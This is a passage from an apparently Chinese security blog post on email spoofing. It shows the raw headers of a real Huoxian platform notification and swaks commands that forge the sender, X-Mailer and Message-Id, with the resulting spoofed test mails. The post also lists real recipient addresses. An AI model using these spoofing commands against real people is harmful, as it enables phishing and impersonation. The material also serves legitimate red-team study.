<a href="mailto:&#x68;&#x61;&#119;&#107;&#48;&#64;&#118;&#105;&#99;&#x74;&#46;&#115;&#x69;&#x74;&#x65;">&#x68;&#x61;&#119;&#107;&#48;&#64;&#118;&#105;&#99;&#x74;&#46;&#115;&#x69;&#x74;&#x65;</a></p><p>​Sender: <a href="mailto:&#53;&#52;&#98;&#x37;&#102;&#99;&#x36;&#54;&#45;&#x33;&#x62;&#x30;&#51;&#x2d;&#49;&#x31;&#x65;&#99;&#45;&#x39;&#97;&#x37;&#x38;&#x2d;&#x35;&#x32;&#53;&#x34;&#x30;&#48;&#x31;&#98;&#100;&#x33;&#97;&#50;&#64;&#112;&#x6f;&#x73;&#x74;&#x6d;&#x61;&#110;&#46;&#x68;&#x75;&#x6f;&#120;&#105;&#97;&#x6e;&#x2e;&#x63;&#x6e;">&#53;&#52;&#98;&#x37;&#102;&#99;&#x36;&#54;&#45;&#x33;&#x62;&#x30;&#51;&#x2d;&#49;&#x31;&#x65;&#99;&#45;&#x39;&#97;&#x37;&#x38;&#x2d;&#x35;&#x32;&#53;&#x34;&#x30;&#48;&#x31;&#98;&#100;&#x33;&#97;&#50;&#64;&#112;&#x6f;&#x73;&#x74;&#x6d;&#x61;&#110;&#46;&#x68;&#x75;&#x6f;&#120;&#105;&#97;&#x6e;&#x2e;&#x63;&#x6e;</a></p><p>2、标题可设置不同</p><p>其他（包含时间）都是相同的</p><p>eml文件：【安全共识】项目进展通知_.eml</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Received:</span> from ucmailc115.sendcloud.org (ucmailc115.sendcloud.org [<span class="hljs-number">120.132</span>.<span class="hljs-number">55.74</span>])<br>by newxmmxsza90.qq.com (NewMX) <span class="hljs-keyword">with</span> SMTP id C8AB2C2<br>for <span class="hljs-operator">&lt;</span><span class="hljs-number">1482056240</span>@qq.com<span class="hljs-operator">&gt;</span>; Mon, <span class="hljs-number">01</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">19</span>:<span class="hljs-number">03</span>:<span class="hljs-number">08</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span><br><span class="hljs-params">X-QQ-mid:</span> xmmxsza90t1635764603tjang5mi6<br><span class="hljs-params">X-QQ-XMAILINFO:</span> NN7ERqmvDdhub2Gwh1cBAp8ZzlvgKuvJVy6fKhlhDpZG9E8bIRScTYUqG3hTCE<br> Y4fj96zCzu67ZxZmpg631lAQDnTVqdHCc<span class="hljs-symbol">/r3lVRH7mcp5jgtjBYHsIg2zFsTQdGZK9F8BFlWINJ8</span><br> iKUfRH<span class="hljs-operator">+</span>FurBOaJDyrswer<span class="hljs-symbol">/h96TmObwf9UcD/6fPQpvJHjFtmLr/c5ep4qAN9UtX+ZybWDsphvhMd</span><br> <span class="hljs-number">3</span>jB0Nzxg<span class="hljs-symbol">/pmuoic00tjRG6SWyEir6/B1gzxRndQeoTBkU20zMHRY5FVSWNtnOgY0Bzx4griypRFp</span><br> cQLpTQ5stdsB94vfI<span class="hljs-operator">+</span>EcF<span class="hljs-symbol">/QAFUY0X7lF2Vdym1OHKKFM4u/pL6dnaPltCmsfPDITeb0WAUobPavR</span><br> bImWPl2rQsL8gEplCOxZgKAmIfysWdDduA4wQfJ2C5nq<span class="hljs-symbol">/8Eej9PbG0KceZoYJ3o/SWAtP+bRWqa1</span><br> o0Jps0MvuYKWnwpZO<span class="hljs-operator">+</span>CfUdCKZJ5axZdpafgCWJ7NDYHtuPFYnNzogFh3I<span class="hljs-symbol">/0C8VWU/60Cntun6Xyb</span><br> W5MboPq6GgRTPmAqHjS50DR52Q1vQiu5f8MaKQxgQqY<span class="hljs-symbol">/CMKT0oqAJiRkSgRgK9MfT0KvkJPM45ro</span><br> OBuz290hepErsDTbd8oIY0FWOZkChmDwUYlnTg33REFl6bOFA1hOs5zcVbeP1fqaTfR6niUP7<span class="hljs-symbol">/yd</span><br> BiCOsHRZK97NyIJ<span class="hljs-symbol">/oxjeS97fmOqHWrTeaavxcIcFXranytIwb/oZ7F3IKb3IW70m4e2cSJhR8QjP</span><br> <span class="hljs-symbol">/de676fHF9eSkNpf5jEBVMbrrlBZqWq4tZRr6Nm1auIOU93FIZnffkcFeIsAfdjxixDpywwexR3Q</span><br> un4vdXkLyrAqYC1<span class="hljs-operator">+</span><span class="hljs-symbol">/lwCiaPYh9iyDofXi5eJsUcXTDooeD82xj4o41lvxOO/8b6rwzWorsRpgWcI</span><br> idzrFqXBBnKDju3Rw3tchjfQ<span class="hljs-operator">+</span>s9Rv1vBV<span class="hljs-operator">+</span>OJjwGBn8I5<span class="hljs-operator">+</span>Wl6mlyEE90cIqm1StCTj3M<span class="hljs-operator">+</span>fXxtLU9l<br> <span class="hljs-number">5</span>eeso3tVaqdE2OHrRWE<span class="hljs-symbol">/4WUrjjB01/PapvkvZbVnsk5I5ZB46n8Cq6eyZF5x2f/vOJB/3F85LRsN</span><br> Tt<span class="hljs-symbol">/uFp69RaBbDHhlw/+Zn8cPXiWSNe/MUmMqGw964RF4kbQdPQPQL7YgvaK+a/BNY1jngEzBylmc</span><br> <span class="hljs-number">6</span>C2rco2pTtDn0zC<span class="hljs-operator">+</span>GdnOGeDV6hGYg1EAUrjJd291rluoB9zBacMb8QolSw7w<span class="hljs-operator">==</span><br><span class="hljs-params">Sender:</span> <span class="hljs-number">54</span>b7fc66-<span class="hljs-number">3</span>b03-<span class="hljs-number">11</span>ec-<span class="hljs-number">9</span>a78-<span class="hljs-number">5254001</span>bd3a2@postman.huoxian.cn<br><span class="hljs-params">DKIM-Signature:</span> v<span class="hljs-operator">=</span><span class="hljs-number">1</span>; <span class="hljs-attr">a</span><span class="hljs-operator">=</span>rsa-sha256; <span class="hljs-attr">c</span><span class="hljs-operator">=</span>relaxed<span class="hljs-symbol">/simple</span>;<br> <span class="hljs-attr">d</span><span class="hljs-operator">=</span>postman.huoxian.cn; <span class="hljs-attr">i</span><span class="hljs-operator">=</span>@postman.huoxian.cn; <span class="hljs-attr">q</span><span class="hljs-operator">=</span>dns<span class="hljs-symbol">/txt</span>; <span class="hljs-attr">s</span><span class="hljs-operator">=</span>mail;<br> <span class="hljs-attr">t</span><span class="hljs-operator">=</span><span class="hljs-number">1635764603</span>; <span class="hljs-attr">h</span><span class="hljs-operator">=</span><span class="hljs-params">content-type :</span> <span class="hljs-params">mime-version :</span> <span class="hljs-params">subject :</span> <span class="hljs-params">from :</span> <span class="hljs-params">to :</span><br> <span class="hljs-params">date :</span> <span class="hljs-params">message-id :</span> <span class="hljs-params">reply-to :</span> <span class="hljs-params">list-unsubscribe :</span> from;<br> <span class="hljs-attr">bh</span><span class="hljs-operator">=</span>U<span class="hljs-operator">/</span>bh3WoQkLMciTodzPBwWfHFVUFbvh8pMVFSu0WVXg4<span class="hljs-operator">=</span>;<br> <span class="hljs-attr">b</span><span class="hljs-operator">=</span>AWHql3thwjkoShz2wkl5Q5CotpxBIhm<span class="hljs-symbol">/cYX8iC84lcx9zYSwr82Z5vUUY1xbVVQBWfVVR</span><br> ejKixS7qPF90EtKOfWmhQMF1Gu4PBq9suFOJL5DaDtQDrssSm6cw0KyKZnde00qyCGBowPj<br> kZlLgHGovi<span class="hljs-operator">/</span><span class="hljs-operator">+</span><span class="hljs-number">5</span>V33q7OepO9LbBseIsk<span class="hljs-operator">=</span><br><span class="hljs-params">Received:</span> from huoxian-sso-prod-celery-<span class="hljs-number">5</span>fdf486bd4-<span class="hljs-number">7</span>tpp5 (Unknown [<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>])         by SendCloud Inbound Server <span class="hljs-keyword">with</span> ESMTPA id <span class="hljs-number">38</span>BF8035-<span class="hljs-number">1</span>FF3-<span class="hljs-number">46</span>E1-<span class="hljs-number">907</span>E-<span class="hljs-number">80</span>EBEF09BE0E.<span class="hljs-number">1</span>         envelope-from <span class="hljs-operator">&lt;</span>noreplay@postman.huoxian.cn<span class="hljs-operator">&gt;</span> (authenticated bits<span class="hljs-operator">=</span><span class="hljs-number">0</span>); Mon, <span class="hljs-number">01</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">19</span>:<span class="hljs-number">03</span>:<span class="hljs-number">23</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span><br><span class="hljs-params">Content-Type:</span> multipart<span class="hljs-symbol">/alternative</span>; <span class="hljs-attr">boundary</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;===============9079726093015921879==&quot;</span><br><span class="hljs-params">MIME-Version:</span> <span class="hljs-number">1.0</span><br><span class="hljs-params">Subject:</span> <span class="hljs-operator">=</span><span class="hljs-operator">?</span>utf-<span class="hljs-number">8</span><span class="hljs-operator">?</span>b<span class="hljs-operator">?</span><span class="hljs-number">44</span>CQ5a6J5YWo5YWx6K<span class="hljs-operator">+</span>G44CR6aG555uu6L<span class="hljs-operator">+</span>b5bGV6YCa55<span class="hljs-operator">+</span>l<span class="hljs-operator">?</span><span class="hljs-operator">=</span><br><span class="hljs-params">From:</span> noreplay@postman.huoxian.cn<br><span class="hljs-params">To:</span> <span class="hljs-number">1482056240</span>@qq.com<br><span class="hljs-params">Date:</span> Mon, <span class="hljs-number">01</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">11</span>:<span class="hljs-number">03</span>:<span class="hljs-number">23</span> <span class="hljs-operator">-</span><span class="hljs-number">0000</span><br><span class="hljs-params">Message-ID:</span> <span class="hljs-operator">&lt;</span><span class="hljs-number">1635764603279</span>_101502_7386_9958.sc-<span class="hljs-number">10</span>_9_13_213-inbound0@postman.huoxian.cn<span class="hljs-operator">&gt;</span><br><span class="hljs-params">REPLY-TO:</span> noreplay@postman.huoxian.cn<br><span class="hljs-params">X-SENDCLOUD-UUID:</span> <span class="hljs-number">1635764603279</span>_101502_7386_9958.sc-<span class="hljs-number">10</span>_9_13_213-inbound0$<span class="hljs-number">1482056240</span>@qq.com<br><span class="hljs-params">X-SENDCLOUD-LOG:</span> <span class="hljs-number">1635764603279</span>_101502_7386_9958.sc-<span class="hljs-number">10</span>_9_13_213-inbound0$<span class="hljs-number">1482056240</span>@qq.com<span class="hljs-comment">#1482056240@qq.com#239907#101502#0#false#false#0#-1</span><br><span class="hljs-params">X-SENDCLOUD-LOG-NEW:</span> MTYzNTc2NDYwMzI3OV8xMDE1MDJfNzM4Nl85OTU4LnNjLTEwXzlfMTNfMjEzLWluYm91bmQwJDE0ODIwNTYyNDBAcXEuY29tIzE0ODIwNTYyNDBAcXEuY29tIzIzOTkwNyMxMDE1MDIjMCNmYWxzZSNmYWxzZSMwIy0x<br><span class="hljs-params">X-SMTPAPI:</span> <br><span class="hljs-params">List-Unsubscribe:</span> <span class="hljs-operator">&lt;</span>mailto:<span class="hljs-number">0</span>_239907_1635764603279_101502_7386_9958.sc-<span class="hljs-number">10</span>_9_13_213-inbound0@postman.huoxian.cn<span class="hljs-operator">&gt;</span><br><br><br><span class="hljs-operator">-</span>-<span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">=</span><span class="hljs-number">9079726093015921879</span><span class="hljs-operator">==</span><br><span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;UTF-8&quot;</span><br><span class="hljs-params">MIME-Version:</span> <span class="hljs-number">1.0</span><br><span class="hljs-params">Content-Transfer-Encoding:</span> <span class="hljs-number">7</span>bit<br><br>Here is the message.<br><span class="hljs-operator">-</span>-<span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">=</span><span class="hljs-number">9079726093015921879</span><span class="hljs-operator">==</span><br><span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/html</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;UTF-8&quot;</span><br><span class="hljs-params">MIME-Version:</span> <span class="hljs-number">1.0</span><br><span class="hljs-params">Content-Transfer-Encoding:</span> <span class="hljs-number">8</span>bit<br><br><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>DOCTYPE html<span class="hljs-operator">&gt;</span><br>                            <span class="hljs-operator">&lt;</span>html lang<span class="hljs-operator">=</span><span class="hljs-string">&quot;en&quot;</span><span class="hljs-operator">&gt;</span><br>                                 <span class="hljs-symbol">&lt;body&gt;</span><br>                                    <span class="hljs-symbol">&lt;p&gt;</span>您关注的项目「某互联网银行安全测试项目」,项目已开始，项目开始时间:<span class="hljs-number">202</span>1-<span class="hljs-number">1</span>1-<span class="hljs-number">01</span> <span class="hljs-number">19</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>,结束时间:<span class="hljs-number">202</span>1-<span class="hljs-number">1</span>1-<span class="hljs-number">30</span> <span class="hljs-number">23</span>:<span class="hljs-number">59</span>:<span class="hljs-number">59</span>,请及时登录火线平台参与项目<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>p<span class="hljs-operator">&gt;</span><br>                                     <span class="hljs-symbol">&lt;button&gt;</span><span class="hljs-operator">&lt;</span>a  href<span class="hljs-operator">=</span><span class="hljs-string">&quot;https://sctrack.sendcloud.net/track/click/eyJuZXRlYXNlIjogImZhbHNlIiwgIm1haWxsaXN0X2lkIjogMCwgInRhc2tfaWQiOiAiIiwgImVtYWlsX2lkIjogIjE2MzU3NjQ2MDMyNzlfMTAxNTAyXzczODZfOTk1OC5zYy0xMF85XzEzXzIxMy1pbmJvdW5kMCQxNDgyMDU2MjQwQHFxLmNvbSIsICJzaWduIjogIjYwMGRhMzliNDAyNDgyYzk1MDE2MGRkMmNlMzZhODQwIiwgInVzZXJfaGVhZGVycyI6IHt9LCAibGFiZWwiOiAwLCAidHJhY2tfZG9tYWluIjogInNjdHJhY2suc2VuZGNsb3VkLm5ldCIsICJyZWFsX3R5cGUiOiAiIiwgImxpbmsiOiAiaHR0cHMlM0EvL3d3dy5odW94aWFuLmNuL3Byb2plY3QvZGV0YWlsJTNGcGlkJTNEMjExIiwgIm91dF9pcCI6ICIxMjAuMTMyLjU1Ljc0IiwgImNvbnRlbnRfdHlwZSI6ICIwIiwgInVzZXJfaWQiOiAxMDE1MDIsICJvdmVyc2VhcyI6ICJmYWxzZSIsICJjYXRlZ29yeV9pZCI6IDIzOTkwN30=.html&quot;</span>  <span class="hljs-operator">&gt;</span>查看详情<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>button<span class="hljs-operator">&gt;</span><br>                                 <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>body<span class="hljs-operator">&gt;</span><br>                            <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>html<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>table cellpadding<span class="hljs-operator">=</span><span class="hljs-string">&quot;0&quot;</span> cellspacing<span class="hljs-operator">=</span><span class="hljs-string">&quot;0&quot;</span> border<span class="hljs-operator">=</span><span class="hljs-string">&quot;0&quot;</span> width<span class="hljs-operator">=</span><span class="hljs-string">&quot;100%&quot;</span><span class="hljs-operator">&gt;</span><span class="hljs-symbol">&lt;tr&gt;</span><span class="hljs-operator">&lt;</span>td align<span class="hljs-operator">=</span><span class="hljs-string">&quot;center&quot;</span> style<span class="hljs-operator">=</span><span class="hljs-string">&quot;padding-top: 10px;&quot;</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>div style<span class="hljs-operator">=</span><span class="hljs-string">&quot;border-top:1px solid #ddd;padding:10px;&quot;</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span><span class="hljs-string">&quot;https://sctrack.sendcloud.net/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogMTAxNTAyLCAidGFza19pZCI6ICIiLCAiZW1haWxfaWQiOiAiMTYzNTc2NDYwMzI3OV8xMDE1MDJfNzM4Nl85OTU4LnNjLTEwXzlfMTNfMjEzLWluYm91bmQwJDE0ODIwNTYyNDBAcXEuY29tIiwgInNpZ24iOiAiZTcxM2ZmNTg2ZDIyYTE5NTg5MDJjNTE5YjkwYzQzODEiLCAidXNlcl9oZWFkZXJzIjoge30sICJsYWJlbCI6IDAsICJ0cmFja19kb21haW4iOiAic2N0cmFjay5zZW5kY2xvdWQubmV0IiwgInJlYWxfdHlwZSI6ICIiLCAibmV0ZWFzZSI6ICJmYWxzZSIsICJvdXRfaXAiOiAiMTIwLjEzMi41NS43NCIsICJjb250ZW50X3R5cGUiOiAiMCIsICJyZWNlaXZlciI6ICIxNDgyMDU2MjQwQHFxLmNvbSIsICJtYWlsbGlzdF9pZCI6IDAsICJvdmVyc2VhcyI6ICJmYWxzZSIsICJjYXRlZ29yeV9pZCI6IDIzOTkwNywgInBhZ2VfaWQiOiAtMX0%3D&quot;</span> target<span class="hljs-operator">=</span><span class="hljs-string">&quot;_blank&quot;</span> style<span class="hljs-operator">=</span><span class="hljs-string">&quot;display: table-cell;display:inline-block;background:#ddd; border-radius:4px;padding: 3px 15px;color:#a6a6a6;text-decoration:none;font-size:12px;&quot;</span><span class="hljs-operator">&gt;</span>点击这里取消订阅<span class="hljs-operator">&lt;</span>br <span class="hljs-operator">/</span><span class="hljs-operator">&gt;</span>click to unsubscribe<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>div<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>td<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>tr<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>table<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">-</span>-<span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">=</span><span class="hljs-number">9079726093015921879</span><span class="hljs-operator">==</span><span class="hljs-operator">-</span>-<br><br><br><br><br></code></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>swaks –header “Subject: vapd10271613” –header-X-Mailer “staff.domain” –header-Message-Id “staff.domain” –to <a href="mailto:&#x6d;&#x61;&#x69;&#x6c;&#x31;&#x40;&#x73;&#116;&#x61;&#102;&#102;&#46;&#x64;&#111;&#109;&#97;&#105;&#x6e;">&#x6d;&#x61;&#x69;&#x6c;&#x31;&#x40;&#x73;&#116;&#x61;&#102;&#102;&#46;&#x64;&#111;&#109;&#97;&#105;&#x6e;</a>,<a href="mailto:&#x6d;&#97;&#x69;&#x6c;&#x32;&#64;&#x73;&#116;&#97;&#102;&#102;&#x2e;&#100;&#111;&#109;&#97;&#105;&#x6e;">&#x6d;&#97;&#x69;&#x6c;&#x32;&#64;&#x73;&#116;&#97;&#102;&#102;&#x2e;&#100;&#111;&#109;&#97;&#105;&#x6e;</a> –from <a href="mailto:&#118;&#97;&#x70;&#x40;&#115;&#x74;&#97;&#x66;&#x66;&#x2e;&#100;&#111;&#x6d;&#x61;&#x69;&#x6e;">&#118;&#97;&#x70;&#x40;&#115;&#x74;&#97;&#x66;&#x66;&#x2e;&#100;&#111;&#x6d;&#x61;&#x69;&#x6e;</a> –ehlo staff.domain –body “2021.1028.1421helloword”</p><p>swaks –header “Subject:test1” –to <a href="mailto:&#x6e;&#99;&#x30;&#105;&#x73;&#x69;&#110;&#105;&#x40;&#102;&#111;&#x78;&#109;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#109;">&#x6e;&#99;&#x30;&#105;&#x73;&#x69;&#110;&#105;&#x40;&#102;&#111;&#x78;&#109;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#109;</a> –from <a href="mailto:&#104;&#97;&#x77;&#x6b;&#x30;&#x40;&#x76;&#105;&#x63;&#x74;&#x2e;&#115;&#x69;&#116;&#x65;">&#104;&#97;&#x77;&#x6b;&#x30;&#x40;&#x76;&#105;&#x63;&#x74;&#x2e;&#115;&#x69;&#116;&#x65;</a> –header-X-Mailer “vict.site”</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Received</span>: from localhost.localdomain ([<span class="hljs-number">114.132.246.141</span>])<br><span class="hljs-attribute">by</span> newxmmxsza90.qq.com (NewMX) with SMTP id <span class="hljs-number">70</span>C31E34<br><span class="hljs-attribute">for</span> &lt;nc0isini@foxmail.com&gt;; Tue, <span class="hljs-number">02</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">28</span>:<span class="hljs-number">12</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">X</span>-QQ-mid: xmmxsza90t1635856092tx091has2<br><span class="hljs-attribute">X</span>-QQ-XMAILINFO: MjtcwOZJa0njs2uRVUuJXHvZ2PknYPWArBD3CyVj9A4cHs7JvBZnQH/hKdIeB1<br> <span class="hljs-attribute">hALD6NnCa6Ssa1H9ZqRKVPIckkKzu4uzKY</span>/FbhJ7v7UwUyKs4RO1uhoT0lLKY9qpsRnLYQIljkC0<br> <span class="hljs-attribute">wsiOSlJIEwJ9VHGogTKBLOTA4y8PrF3eVAowQyrJd9trwsfBzbIJfbp7MXKSu064mG0TJCOQOwCl</span><br> <span class="hljs-attribute">dsyBj01rjnZhJU</span>/PNbogZYxRvdCvKw0Njxzu9U+H5HWzkp13wrUacPPqojN8JXvoY3bKR9xq5EXc<br> <span class="hljs-attribute">CkL</span>/a4ldNIM32edwRqnPeDvIx+fVZDIJ6ojgDhyWbNEl8ix8DBVcnmBd5sWSYcWO48uggTG0rvFO<br> <span class="hljs-attribute">4aW</span>+<span class="hljs-number">9</span>wYE80kIpbNSPfb32Ufzc0Bd/CiKAs3erc1d+gSBFs/wYpmhTarrZ+Gq8MWzGNdAj6phj3G/<br> <span class="hljs-attribute">DH91gW</span>//Af43ioJgrR7hM0xwlleI5RShYvwCl0h4NXm9SfWgzf0BEYy6HHW/xhAImxBEca7r3hOa<br> <span class="hljs-attribute">1TBAo9VvnCf8</span>+nmN5VAVae/tdnDiqTtwTtBb6HLj2h76CbvwTh0Tt3j22SPTfPwh5BPJ7mldOIwt<br> <span class="hljs-attribute">8R</span>+<span class="hljs-number">0</span>TUunNW6vX7ixNg9AHvV6vPrrO0UBSO5psBV/U22AF7Lmp6yfxhCnwRbkyoTDuy70cBJ38rHY<br> <span class="hljs-attribute">JDXqu08XbfSiQ9w</span>+uelYsd5C6acz2auVDr8/j63JCs5qDpSgcHdTxL0xZFKjEp1ogZd77pP1FiB6<br> <span class="hljs-attribute">olVRj1zKeg0VYdahstB1</span>+AfgshNzSL8hdA<br><span class="hljs-attribute">Date</span>: Tue, <span class="hljs-number">02</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">28</span>:<span class="hljs-number">12</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">To</span>: nc0isini@foxmail.com<br><span class="hljs-attribute">From</span>: hawk0@vict.site<br><span class="hljs-attribute">Subject</span>:test1<br><span class="hljs-attribute">Message</span>-Id: &lt;<span class="hljs-number">20211102202812</span>.<span class="hljs-number">1761846</span>@localhost.localdomain&gt;<br><span class="hljs-attribute">X</span>-Mailer: vict.site<br><br><span class="hljs-attribute">This</span> is a test mailing<br></code></pre></td></tr></table></figure><p>swaks –header “Subject:test1” –to <a href="mailto:&#110;&#x63;&#x30;&#105;&#x73;&#105;&#x6e;&#x69;&#64;&#102;&#x6f;&#x78;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#110;&#x63;&#x30;&#105;&#x73;&#105;&#x6e;&#x69;&#64;&#102;&#x6f;&#x78;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;</a> –from <a href="mailto:&#x68;&#97;&#x77;&#x6b;&#48;&#x40;&#x76;&#x69;&#x63;&#116;&#x2e;&#115;&#x69;&#x74;&#x65;">&#x68;&#97;&#x77;&#x6b;&#48;&#x40;&#x76;&#x69;&#x63;&#116;&#x2e;&#115;&#x69;&#x74;&#x65;</a></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Received:</span> from localhost.localdomain ([<span class="hljs-number">114.132</span>.<span class="hljs-number">246.141</span>])<br>by newxmmxszc77.qq.com (NewMX) <span class="hljs-keyword">with</span> SMTP id <span class="hljs-number">63</span>B9BAA0<br>for <span class="hljs-operator">&lt;</span>nc0isini@foxmail.com<span class="hljs-operator">&gt;</span>; Tue, <span class="hljs-number">02</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">24</span>:<span class="hljs-number">59</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span><br><span class="hljs-params">X-QQ-mid:</span> xmmxszc77t1635855899t7bp0g5xq<br><span class="hljs-params">X-QQ-XMAILINFO:</span> MSstRF5C1p<span class="hljs-symbol">/jvJQ7kmkfTyc2EJJ9X6ZkP4+bxJ4Dj/ED4g9FYbGeb/YiyAFbU9</span><br> IX<span class="hljs-symbol">/vq43cBNmqRVvdjGOYKoNy3Fu80/zPjkx+vD83dby91KPYANKnAlINj/74SA1FxANtG9zIhJ/C</span><br> Rcg5cGBd2RsuLrooKppy<span class="hljs-symbol">/IgBKCdF4bH0aNLLIr3KGZ8oTZDf/agRi1fDITpMyqCYEWMyoLXMsi6N</span><br> szeCp88mzW8yEG80s1qNPjSGEyS5nV87hE9zgoqBrY9BIpwgNFauvB2L0NExL<span class="hljs-symbol">/llhTrK4oSkHwGg</span><br> EhkmCtClZrQt3<span class="hljs-symbol">/4rLqLZoxPyrS+LkZFagabNO/L6VkJtNsdfFQ8msOnkVYDSsrzM0Q9UGwMURN/2</span><br> <span class="hljs-number">4</span>dpNl5T<span class="hljs-symbol">/07O1WV6qm9TU/flYi1uLTYqWU06ceVniiQ4dJdMo8v1lz309jAtNwMVFxVqhIxnm3vVd</span><br> <span class="hljs-number">6</span>zePbC<span class="hljs-symbol">/4DRoNc5eccbT404Y70r9nLWDmMgq342jWEBU9ta3kkx+ZbXysr/LqHVWl+Hm08qlNgAGL</span><br> kMc0AMQbHa5Ea6kjP04Pzl<span class="hljs-symbol">/KU3Yn7nae/IID8Cd8Xeta/M4qdsomKq8hNQhWMIPmOLkU3E9wuwaj</span><br> t0bFCf4dnO4DcTeJQv3QZVWcCSGkqzbjcrIannBPWDTLOu<span class="hljs-operator">+</span>rO9WCYo817bSYntFqlWflCR15mXog<br> <span class="hljs-operator">/</span>jhK5oaZ0a5uaCO6HA00YZP8CfKv6pXDYM6lzD6tkZZVI4YC<span class="hljs-operator">+</span>A<span class="hljs-operator">/</span><span 